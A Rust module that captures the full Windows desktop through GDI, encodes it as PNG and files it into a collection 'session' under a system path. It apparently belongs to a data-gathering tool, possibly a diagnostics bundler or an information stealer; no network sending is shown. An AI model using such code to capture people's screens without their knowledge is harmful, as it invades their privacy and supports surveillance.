//! Desktop capture through GDI, encoded as PNG.

use std::ptr;

use winapi::shared::minwindef::DWORD;
use winapi::um::wingdi::{
    BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, GetDIBits,
    SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY,
};
use winapi::um::winuser::{GetDC, GetSystemMetrics, ReleaseDC, SM_CXSCREEN, SM_CYSCREEN};

use crate::session::Session;

fn capture_rgb() -> Option<(u32, u32, Vec<u8>)> {
    unsafe {
        let screen = GetDC(ptr::null_mut());
        if screen.is_null() {
            return None;
        }
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);
        if width <= 0 || height <= 0 {
            ReleaseDC(ptr::null_mut(), screen);
            return None;
        }

        let memory = CreateCompatibleDC(screen);
        let bitmap = CreateCompatibleBitmap(screen, width, height);
        if memory.is_null() || bitmap.is_null() {
            if !bitmap.is_null() {
                DeleteObject(bitmap as *mut _);
            }
            if !memory.is_null() {
                DeleteDC(memory);
            }
            ReleaseDC(ptr::null_mut(), screen);
            return None;
        }

        let previous = SelectObject(memory, bitmap as *mut _);
        let blit = BitBlt(memory, 0, 0, width, height, screen, 0, 0, SRCCOPY);

        let mut info: BITMAPINFO = std::mem::zeroed();
        info.bmiHeader.biSize = std::mem::size_of::<BITMAPINFOHEADER>() as DWORD;
        info.bmiHeader.biWidth = width;
        info.bmiHeader.biHeight = -height; // top-down
        info.bmiHeader.biPlanes = 1;
        info.bmiHeader.biBitCount = 32;
        info.bmiHeader.biCompression = BI_RGB;

        let stride = (width as usize) * 4;
        let mut buffer = vec![0u8; stride * height as usize];
        let lines = GetDIBits(
            memory,
            bitmap,
            0,
            height as u32,
            buffer.as_mut_ptr() as *mut _,
            &mut info,
            DIB_RGB_COLORS,
        );

        SelectObject(memory, previous);
        DeleteObject(bitmap as *mut _);
        DeleteDC(memory);
        ReleaseDC(ptr::null_mut(), screen);

        if blit == 0 || lines == 0 {
            return None;
        }

        // BGRA -> RGB
        let mut rgb = Vec::with_capacity((width as usize) * (height as usize) * 3);
        for pixel in buffer.chunks_exact(4) {
            rgb.push(pixel[2]);
            rgb.push(pixel[1]);
            rgb.push(pixel[0]);
        }
        Some((width as u32, height as u32, rgb))
    }
}

fn encode_png(width: u32, height: u32, rgb: &[u8]) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    {
        let mut encoder = png::Encoder::new(&mut out, width, height);
        encoder.set_color(png::ColorType::Rgb);
        encoder.set_depth(png::BitDepth::Eight);
        let mut writer = encoder.write_header().ok()?;
        writer.write_image_data(rgb).ok()?;
    }
    Some(out)
}

pub fn collect(session: &mut Session) {
    let Some((width, height, rgb)) = capture_rgb() else {
        session.note("screenshot: capture failed");
        return;
    };
    let Some(png) = encode_png(width, height, &rgb) else {
        session.note("screenshot: encode failed");
        return;
    };
    if session.put("system/screenshot.png", &png) {
        session.note(&format!(
            "screenshot: {width}x{height}, {}",
            crate::util::human_size(png.len() as u64)
        ));
    }
}
